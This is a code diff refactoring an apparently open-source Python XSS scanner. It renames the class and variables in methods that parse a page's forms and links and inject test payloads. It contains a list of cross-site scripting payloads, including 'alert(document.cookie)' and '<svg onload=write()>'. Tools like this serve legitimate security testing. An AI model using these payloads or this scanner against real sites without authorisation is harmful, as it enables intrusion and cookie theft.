@@ -24,11 +24,11 @@ class Style:
     yellow = '\033[93m'
 
 
-class core:
+class Core:
 
     @classmethod
     def generate(cls, eff):
-        FUNCTION = [
+        payloads = [
             "prompt(5000/200)",
             "alert(6000/3000)",
             "alert(document.cookie)",
@@ -56,33 +56,33 @@ class core:
             "<svg onload=write()>"
         ]
         if eff == 1:
-            return FUNCTION[randint(5, 9)]
+            return payloads[randint(5, 9)]
 
         elif eff == 2:
-            return FUNCTION[randint(10, 14)]
+            return payloads[randint(10, 14)]
 
         elif eff == 3:
-            return FUNCTION[randint(15, 20)]
+            return payloads[randint(15, 20)]
 
         elif eff == 4:
-            return FUNCTION[randint(5, 9)]
+            return payloads[randint(5, 9)]
 
         elif eff == 5:
-            return FUNCTION[randint(10, 14)]
+            return payloads[randint(10, 14)]
 
         elif eff == 6:
-            return FUNCTION[randint(15, 20)]
+            return payloads[randint(15, 20)]
 
     @classmethod
     def post_method(cls):
-        bsObj = BeautifulSoup(cls.body, "html.parser")
-        forms = bsObj.find_all("form", method=True)
+        bs_obj = BeautifulSoup(cls.body, "html.parser")
+        forms = bs_obj.find_all("form", method=True)
         vuln_logger = VulnerabilityLogger()
         for form in forms:
             try:
                 action = form["action"]
             except KeyError:
-                action = self.url
+                action = cls.url
 
             if form["method"].lower().strip() == "post":
                 Log.warning("Target have form with POST method: " +
@@ -125,8 +125,8 @@ class core:
     @classmethod
     def get_method_form(cls):
         vuln_logger = VulnerabilityLogger()
-        bsObj = BeautifulSoup(cls.body, "html.parser")
-        forms = bsObj.find_all("form", method=True)
+        bs_obj = BeautifulSoup(cls.body, "html.parser")
+        forms = bs_obj.find_all("form", method=True)
         for form in forms:
             try:
                 action = form["action"]
@@ -179,8 +179,8 @@ class core:
     @classmethod
     def get_method(cls):
         vuln_logger = VulnerabilityLogger()
-        bsObj = BeautifulSoup(cls.body, "html.parser")
-        links = bsObj.find_all("a", href=True)
+        bs_obj = BeautifulSoup(cls.body, "html.parser")
+        links = bs_obj.find_all("a", href=True)
         for a in links:
             url = a["href"]
             if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith(
